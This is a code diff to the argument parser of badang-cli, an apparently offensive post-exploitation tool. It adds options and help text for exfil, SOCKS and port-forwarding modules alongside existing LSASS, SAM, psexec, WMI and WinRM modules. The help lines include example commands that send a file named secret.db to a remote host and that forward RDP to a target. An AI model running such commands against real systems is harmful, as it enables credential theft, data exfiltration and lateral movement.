@@ -59,6 +59,11 @@ pub struct CLI {
     pub postex_command: String,
     pub postex_service: String,
     pub postex_payload: String,
+    pub postex_file: String,
+    pub postex_listen_port: u16,
+    pub postex_remote_host: String,
+    pub postex_remote_port: u16,
+    pub postex_exfil_key: String,
 }
 
 impl CLI {
@@ -120,6 +125,11 @@ impl CLI {
             postex_command: String::new(),
             postex_service: String::new(),
             postex_payload: String::new(),
+            postex_file: String::new(),
+            postex_listen_port: 0,
+            postex_remote_host: String::new(),
+            postex_remote_port: 0,
+            postex_exfil_key: String::new(),
         };
 
         let mut i = 1;
@@ -451,6 +461,42 @@ impl CLI {
                         cli.postex_payload = args[i].clone();
                     }
                 }
+                "--file" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.postex_file = args[i].clone();
+                    }
+                }
+                "--listen-port" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.postex_listen_port = args[i].parse().unwrap_or_else(|_| {
+                            eprintln!("Invalid port: {}", args[i]);
+                            process::exit(1);
+                        });
+                    }
+                }
+                "--remote-host" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.postex_remote_host = args[i].clone();
+                    }
+                }
+                "--remote-port" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.postex_remote_port = args[i].parse().unwrap_or_else(|_| {
+                            eprintln!("Invalid port: {}", args[i]);
+                            process::exit(1);
+                        });
+                    }
+                }
+                "--exfil-key" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.postex_exfil_key = args[i].clone();
+                    }
+                }
                 _ => {
                     eprintln!("Unknown argument: {}", args[i]);
                     print_help();
@@ -497,7 +543,7 @@ impl CLI {
         // Module is required for postex command
         if cli.command == "postex" && !cli.dry_run && cli.postex_module.is_empty() {
             eprintln!("ERROR: --module is required for postex command.");
-            eprintln!("Modules: lsass, sam, token, psexec, wmi, winrm");
+            eprintln!("Modules: lsass, sam, token, psexec, wmi, winrm, exfil, socks, portfwd");
             process::exit(1);
         }
         if cli.command == "postex" && !cli.postex_module.is_empty() {
@@ -687,7 +733,7 @@ fn print_help() {
     println!("  --action <ACTION>    On detection: report, exit (default: report)");
     println!();
     println!("POST-EXPLOITATION OPTIONS:");
-    println!("  --module <MODULE>    Module: lsass, sam, token, psexec, wmi, winrm");
+    println!("  --module <MODULE>    Module: lsass, sam, token, psexec, wmi, winrm, exfil, socks, portfwd");
     println!("  --remote <HOST>      Remote target host (lateral movement)");
     println!("  --postex-output <P>  Output path (memory snapshot / registry export)");
     println!("  --postex-user <USER> Remote credentials username");
@@ -703,6 +749,9 @@ fn print_help() {
     println!("  badang-cli postex --module psexec --remote 10.0.0.5 --postex-user admin --postex-pass pass --postex-payload svc.exe -x -c");
     println!("  badang-cli postex --module wmi --remote 10.0.0.5 --postex-cmd \"cmd /c whoami\" -x -c");
     println!("  badang-cli postex --module winrm --remote 10.0.0.5 --postex-cmd \"hostname\" -x -c");
+    println!("  badang-cli postex --module exfil --file secret.db --remote-host 10.0.0.1 --remote-port 8443 -x -c");
+    println!("  badang-cli postex --module socks --listen-port 1080 -x -c");
+    println!("  badang-cli postex --module portfwd --listen-port 3389 --remote-host 10.0.0.5 --remote-port 3389 -x -c");
     println!();
     println!("LOADER EXAMPLES:");
     println!("  badang-cli loader --check all -x -c");
